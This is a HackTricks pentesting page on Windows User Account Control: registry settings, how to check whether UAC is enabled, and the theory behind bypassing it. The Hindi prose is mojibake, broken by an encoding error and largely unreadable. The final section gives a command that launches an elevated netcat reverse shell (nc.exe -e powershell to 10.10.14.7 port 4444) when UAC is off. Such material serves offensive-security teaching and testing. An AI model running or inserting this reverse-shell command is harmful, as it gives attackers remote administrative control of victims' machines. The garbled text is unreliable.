# UAC - User Account Control

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдд: рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛** рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдВ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ **рдЙрдЪреНрдЪ рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░реЙрдореНрдкреНрдЯ** рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИред рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди `рдЕрдЦрдВрдбрддрд╛` рд╕реНрддрд░ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдПрдХ **рдЙрдЪреНрдЪ рд╕реНрддрд░** рдХрд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рдРрд╕реЗ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЬрдм UAC рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдФрд░ рдХрд╛рд░реНрдп рд╣рдореЗрд╢рд╛ **рдПрдХ рдЧреИрд░-рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЗ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓рддреЗ рд╣реИрдВ** рдЬрдм рддрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдЗрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ/рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реНрдерд╛рдирд╛рдзрд┐рдХрд╛рд░реА рд╕реНрддрд░ рдХреА рдкрд╣реБрдВрдЪ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЕрдзрд┐рдХреГрдд рдирд╣реАрдВ рдХрд░рддрд╛ред рдпрд╣ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╕реБрдирд┐рддрд┐ рд╣реИ рдЬреЛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рд╕реЗ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реАрдорд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

рдЬрдм UAC рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ, рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ 2 рдЯреЛрдХрди рдорд┐рд▓рддреЗ рд╣реИрдВ: рдПрдХ рдорд╛рдирдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреБрдВрдЬреА, рд╕рд╛рдорд╛рдиреНрдп рд╕реНрддрд░ рдХреЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдФрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓рд╛ред

рдпрд╣ [рдкреГрд╖реНрда](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC рдХрд╛рдо рдХреИрд╕реЗ рдХрд░рддрд╛ рд╣реИ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдЪрд░реНрдЪрд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд▓реЙрдЧрдСрди рдкреНрд░рдХреНрд░рд┐рдпрд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрднрд╡, рдФрд░ UAC рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрдерд╛рдиреАрдп рд╕реНрддрд░ рдкрд░ (secpol.msc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ UAC рдХреЛ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╡рд┐рдиреНрдпрд╕реНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рд╕рдореВрд╣ рдиреАрддрд┐ рд╡рд╕реНрддреБрдУрдВ (GPO) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рдиреНрдпрд╕реНрдд рдФрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдбреЛрдореЗрди рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВред рд╡рд┐рднрд┐рдиреНрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреА рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдЪрд░реНрдЪрд╛ [рдпрд╣рд╛рдБ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) рдХреА рдЧрдИ рд╣реИред UAC рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ 10 рд╕рдореВрд╣ рдиреАрддрд┐ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдЙрдкрд▓рдмреНрдз рд╣реИрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд╛рд▓рд┐рдХрд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ:

| рд╕рдореВрд╣ рдиреАрддрд┐ рд╕реЗрдЯрд┐рдВрдЧ                                                                                                                                                                                                                                                                                                                                                           | рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА                | рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
### UAC рдмрд╛рдпрдкрд╛рд╕ рд╕рд┐рджреНрдзрд╛рдВрдд

рдХреБрдЫ рдХрд╛рд░реНрдпрдХреНрд░рдо **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реА рд╕рдореВрд╣** рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ** рддреЛ **рдСрдЯреЛрдЗрд▓реЗрд╡реЗрдЯреЗрдб рд╣реЛрддреЗ рд╣реИрдВ**ред рдЗрди рдмрд╛рдЗрдирд░реАрдЬ рдореЗрдВ рдЙрдирдХреЗ _**рдореИрдирд┐рдлреЗрд╕реНрдЯ**_ рдореЗрдВ _**autoElevate**_ рд╡рд┐рдХрд▓реНрдк рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рди _**True**_ рд╣реЛрддрд╛ рд╣реИред рдмрд╛рдЗрдирд░реА рдХреЛ **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд** рднреА рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЗрд╕рдХреЗ рдмрд╛рдж, **UAC** рдХреЛ **рдмрд╛рдпрдкрд╛рд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдордзреНрдп рдЕрднрд┐рдХрд░рдг рд╕реНрддрд░ рд╕реЗ рдЙрдЪреНрдЪ рд╕реНрддрд░ рдкрд░ рдЙрдЪреНрдЪрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП) рдХреБрдЫ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдмрд╛рдЗрдирд░реАрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ **рд╡рд┐рд╡рд┐рдз рдХреЛрдб** рдХреЛ **рдЪрд▓рд╛ рд╕рдХреЗрдВ** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ **рдЙрдЪреНрдЪ рд╕реНрддрд░ рдХреЗ рдЕрднрд┐рдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛** рд╕реЗ рдЪрд▓рд╛рдИ рдЬрд╛рдПрдЧреАред

рдЖрдк рдЙрдкрдХрд░рдг _**sigcheck.exe**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмрд╛рдЗрдирд░реА рдХрд╛ _**рдореИрдирд┐рдлреЗрд╕реНрдЯ**_ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ рдЖрдк _Process Explorer_ рдпрд╛ _Process Monitor_ (Sysinternals рдХрд╛) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ **рдЕрднрд┐рдХрд░рдг рд╕реНрддрд░** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

### UAC рдХреА рдЬрд╛рдБрдЪ

UAC рд╕рдХреНрд╖рдо рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
рдпрджрд┐ рдпрд╣ **`1`** рд╣реИ рддреЛ UAC **рд╕рдХреНрд░рд┐рдп** рд╣реИ, рдпрджрд┐ рдпрд╣ **`0`** рд╣реИ рдпрд╛ рдпрд╣ **рдореМрдЬреВрдж рдирд╣реАрдВ** рд╣реИ, рддреЛ UAC **рдирд┐рд╖реНрдХреНрд░рд┐рдп** рд╣реИред

рдлрд┐рд░, рдЬрд╛рдВрдЪреЗрдВ **рдХреМрди рд╕рд╛ рд╕реНрддрд░** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* рдпрджрд┐ **`0`** рд╣реИ рддреЛ, UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рдЬреИрд╕реЗ **рдЕрдХреНрд╖рдо**)
* рдпрджрд┐ **`1`** рд╣реИ рддреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЛ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП **рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛** (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`2`** (**рд╣рдореЗрд╢рд╛ рдореБрдЭреЗ рд╕реВрдЪрд┐рдд рдХрд░реЗрдВ**) UAC рд╣рдореЗрд╢рд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рдкреВрдЫреЗрдЧрд╛ рдЬрдм рд╡рд╣ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреБрдЫ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`3`** `1` рдХреА рддрд░рд╣ рд╣реИ рд▓реЗрдХрд┐рди рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ
* рдпрджрд┐ **`4`** `2` рдХреА рддрд░рд╣ рд╣реИ рд▓реЗрдХрд┐рди рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ
* рдпрджрд┐ **`5`** (**рдбрд┐рдлрд╝реЙрд▓реНрдЯ**) рдпрд╣ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реЗ рдкреВрдЫреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рд╡рд╣ рдЧреИрд░ Windows рдмрд╛рдЗрдирд░реА рдХреЛ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдиреЗ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ

рдлрд┐рд░, рдЖрдкрдХреЛ **`LocalAccountTokenFilterPolicy`** рдХреЗ рдорд╛рди рдХреА рджреЗрдЦрднрд╛рд▓ рдХрд░рдиреА рд╣реЛрдЧреА\
рдпрджрд┐ рдорд╛рди **`0`** рд╣реИ, рддреЛ рдХреЗрд╡рд▓ **RID 500** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (**рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ**) UAC рдХреЗ рдмрд┐рдирд╛ **рдкреНрд░рд╢рд╛рд╕рдХ рдХрд╛рд░реНрдп** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдпрджрд┐ рдЗрд╕рдХрд╛ `1` рд╣реИ, **"рдкреНрд░рд╢рд╛рд╕рдХ" рд╕рдореВрд╣ рдХреЗ рд╕рднреА рдЦрд╛рддреЗ** рдЗрд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдФрд░, рдЕрдВрдд рдореЗрдВ **`FilterAdministratorToken`** рдХреБрдВрдЬреА рдХреЗ рдорд╛рди рдХреА рджреЗрдЦрднрд╛рд▓ рдХрд░реЗрдВ\
рдпрджрд┐ **`0`**(рдбрд┐рдлрд╝реЙрд▓реНрдЯ), рддреЛ **рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддрд╛** рджреВрд░рд╕реНрде рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ **`1`** рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдЦрд╛рддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ **рджреВрд░рд╕реНрде рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдп** рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрдм рддрдХ `LocalAccountTokenFilterPolicy` рдХреЛ `1` рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

#### рд╕рд╛рд░рд╛рдВрд╢

* рдпрджрд┐ `EnableLUA=0` рдпрд╛ **рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**, **рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА рдХреЛрдИ UAC рдирд╣реАрдВ**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=1` , рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА рдХреЛрдИ UAC рдирд╣реАрдВ**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=0` рдФрд░ `FilterAdministratorToken=0`, RID 500 рдХреЗ рд▓рд┐рдП рдХреЛрдИ UAC рдирд╣реАрдВ (рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ)**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=0` рдФрд░ `FilterAdministratorToken=1`, рд╕рднреА рдХреЗ рд▓рд┐рдП UAC**

рдЗрд╕ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **metasploit** рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХрддреНрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `post/windows/gather/win_privs`

рдЖрдк рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рдореВрд╣реЛрдВ рдХреА рдЬрд╛рдБрдЪ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
net user %username%
whoami /groups | findstr Level
```
## UAC рдмрд╛рдпрдкрд╛рд╕

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рдЧреНрд░рд╛рдлрд┐рдХрд▓ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ UAC рдмрд╛рдпрдкрд╛рд╕ рд╕реАрдзрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдЖрддрд╛ рд╣реИ рддреЛ рдЖрдк рдмрд╕ "рд╣рд╛рдБ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

UAC рдмрд╛рдпрдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИ: **UAC рд╕рдХреНрд░рд┐рдп рд╣реИ, рдЖрдкрдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╛рдзреНрдпрдо рдЕрдЦрдВрдбрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИ, рдФрд░ рдЖрдкрдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдореВрд╣ рдореЗрдВ рд╣реИ**ред

рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╣реИ рдХрд┐ **рдпрджрд┐ UAC рд╕рд░реНрд╡реЛрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдореЗрдВ рд╣реИ (рд╣рдореЗрд╢рд╛) рддреЛ рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдЕрдиреНрдп рд╕реНрддрд░реЛрдВ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рдореЗрдВ рд╣реЛрдиреЗ рд╕реЗ рдХрд╣реАрдВ рдЬреНрдпрд╛рджрд╛ рдХрдард┐рди рд╣реИ**ред

### UAC рдирд┐рд╖реНрдХреНрд░рд┐рдп

рдпрджрд┐ UAC рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реИ (`ConsentPromptBehaviorAdmin` **`0`** рд╣реИ) рддреЛ рдЖрдк **рдПрдбрдорд┐рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ** (рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░) рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
